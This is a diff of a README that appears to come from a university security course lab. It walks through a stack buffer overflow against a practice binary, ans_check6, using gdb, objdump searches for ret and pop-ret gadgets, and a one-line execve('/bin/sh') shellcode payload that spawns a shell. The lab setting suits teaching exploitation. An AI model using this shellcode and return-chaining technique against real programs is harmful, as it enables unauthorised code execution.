@@ -15,20 +15,32 @@
 2. Run gdb and set break points.
 3. Run with the random argument you can notice.
 4. Find the parameter to check_answer function from the stack using x/72xw $esp.
-5. If you investigate stack frame further, you can find exact same address up in the stack frame. Why? because main function call also resides in the stack and it also has input arguments.(These are argc, argv)
+5. If you investigate stack frame further, you can find exact same address upper portion in the stack frame. Why? because main function call also resides in the stack frame and it also has input arguments.(These are argc, argv)
 6. Now, you can caculate how many bytes do we need to overwrite up until the main argv. If we can reach to that point, we may execute main function's argument strings(It is a malicous code)
+7. In the image below, we are going to overwrite from Number 1 to Number 5. But What are we going to write?
+8. Find the address of 'ret' and 'pop-ret' instruction! In the program there should be several ret and pop-ret instruction itself. We will use it for purpose.
 
-## 
-![howto3](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/howto3.png)
-
-## 
-![howto1](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/howto1.png)
-![howto2](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/howto2.png)
-
-
-
+## How to find 'ret' and 'pop-ret'
+```
 objdump -D ans_check6 | less
 objdump -D ans_check6 | grep -B3 ret | grep -A1 pop
+```
+## The payload I use
+```
+./ans_check6 $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90'+'\x21\x86\x04\x08'*55+'\x91\x83\x04\x08'")
+```
+
+## Result of getting a new shell 
+![howto4](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/howto4.png)
+
+## Figure out how many bytes do we need to fill up
+![howto3](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/howto3.png)
+
+## Our stack frame
+![howto1](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/howto1.png)
+
+## Our strategy
+![howto2](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/howto2.png)
 
 
 ## ans_check6.c
